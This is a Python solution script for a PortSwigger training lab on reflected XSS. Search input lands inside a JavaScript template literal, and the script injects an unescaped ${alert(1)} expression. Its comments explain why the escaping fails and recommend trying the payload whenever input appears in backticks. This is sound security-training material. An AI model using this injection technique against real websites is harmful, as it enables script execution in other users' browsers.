# Lab 24 — Reflected XSS into a template literal with angle brackets, single,
#           double quotes, backslash and backticks Unicode-escaped
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped
#
# Vulnerability: Search — input lands inside a JavaScript template literal
# Aim:           Call alert without breaking out of the string at all
#
# Technique:
#   Every break-out character is escaped:
#     < > " ' \ ` → all encoded or escaped
#   But the string is a template literal (backtick string):
#     var message = `0 search results for 'INPUT'`;
#
#   Template literals support ${} expression interpolation.
#   $ and { are NOT escaped → inject an expression directly:
#     Input:  ${alert(1)}
#     Result: var message = `0 search results for '${alert(1)}'`;
#
#   No string break-out needed. The ${} is evaluated as JS — alert fires.
#   Whenever you see input inside backticks, try ${alert(1)} immediately.
#
# Usage: python xss_lab24.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "${alert(1)}"

if __name__ == "__main__":
    banner()
    section("LAB 24 — REFLECTED XSS: TEMPLATE LITERAL INJECTION")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab24.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "Template literal ${} injection")

    print()
    print("  ➜  Open this URL in a browser:")
    print(f"     {r.url}")
    print("  ℹ  ${} is template literal interpolation — evaluated as JS expression.")
    print("     No break-out needed: $ and { are never escaped.")
